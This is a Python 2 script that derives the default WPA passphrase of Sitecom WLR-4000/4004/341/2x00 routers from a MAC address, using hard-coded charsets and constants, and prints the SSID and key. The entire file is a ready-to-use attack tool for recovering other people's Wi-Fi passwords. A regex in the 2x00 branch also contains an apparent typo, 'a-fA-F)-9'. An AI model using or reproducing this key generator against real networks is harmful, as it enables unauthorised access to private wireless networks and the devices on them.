#
# Default WPA key generator for Sitecom WLR-4000/4004/341/2x00 routers
#

import argparse
import os
import logging
import sys
import hashlib
import re

CHARSETS = {
    "4000": (
        "23456789ABCDEFGHJKLMNPQRSTUVWXYZ38BZ",
        "WXCDYNJU8VZABKL46PQ7RS9T2E5H3MFGPWR2"
    ),

    "4004": (
        "JKLMNPQRST23456789ABCDEFGHUVWXYZ38BK",
        "E5MFJUWXCDKL46PQHAB3YNJ8VZ7RS9TR2GPW"
    ),

    "341": (
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "W0X1CDYNJU8VOZA0BKL46PQ7RS9T2E5HI3MF"
    ),

    "2x00": (
        "",
        ""
    ),
}

def generateKey(mac, model, keylength = 12):
    global CHARSETS
    assert model in CHARSETS

    charset1, charset2 = CHARSETS[model]
    assert len(charset1) == len(charset2)

    mac = mac.replace(":", "").decode("hex")
    assert len(mac) == 6

    val = int(mac[2:6].encode("hex"), 16)

    magic1 = 0x98124557
    magic2 = 0x0004321a
    magic3 = 0x80000000

    offsets = []
    for i in range(keylength):
        if (val & 0x1) == 0:
            val = val ^ magic2
            val = val >> 1
        else:
            val = val ^ magic1
            val = val >> 1
            val = val | magic3

        offset = val % len(charset1)
        offsets.append(offset)

    wpakey = ""
    wpakey += charset1[offsets[0]]

    for i in range(0, keylength-1):
        magic3 = offsets[i]
        magic1 = offsets[i+1]

        if magic3 != magic1:
            magic3 = charset1[magic1]
        else:
            magic3 = (magic3 + i) % len(charset1)
            magic3 = charset2[magic3]
        wpakey += magic3

    return wpakey


def main():
    global CHARSETS
    parser = argparse.ArgumentParser(formatter_class =
                                     argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("-m", "--model", choices = CHARSETS.keys(),
                        required = True, help = "device model")
    parser.add_argument('mac', help = "MAC address")
    args = parser.parse_args()
    mac3 = args.mac.replace(":", "")[:6].upper()
    print "===== Default WPA key generator for Sitecom WLR-4000/4004/341/2x00 routers ======="
    if mac3 != "000CF6": print "WARNING: This is not a Sitecom router according to MAC address, generating anyway.. "
    ssid = "Sitecom%s" % args.mac.replace(":", "")[6:].upper()
    if args.model == "2x00":
           charset = 'ABCDEFGHJKLMNPQRSTUVWXYZ'
           md5 = hashlib.md5()
           md5.update(re.sub(r'[^a-fA-F)-9]', '', args.mac))
           wpa = ''
           magicnr = int(md5.hexdigest()[-16:],16)
           for i in range(0, 12):
               wpa += charset[magicnr%24]
               magicnr /=24
    else: wpa = generateKey(args.mac, args.model)
    print "MAC:   %s" % args.mac
#    print "MODEL: WL(R)%s" % args.model
    print "SSID:  %s" % ssid
    print "WPA:   %s" % wpa

if __name__ == "__main__":
    main()
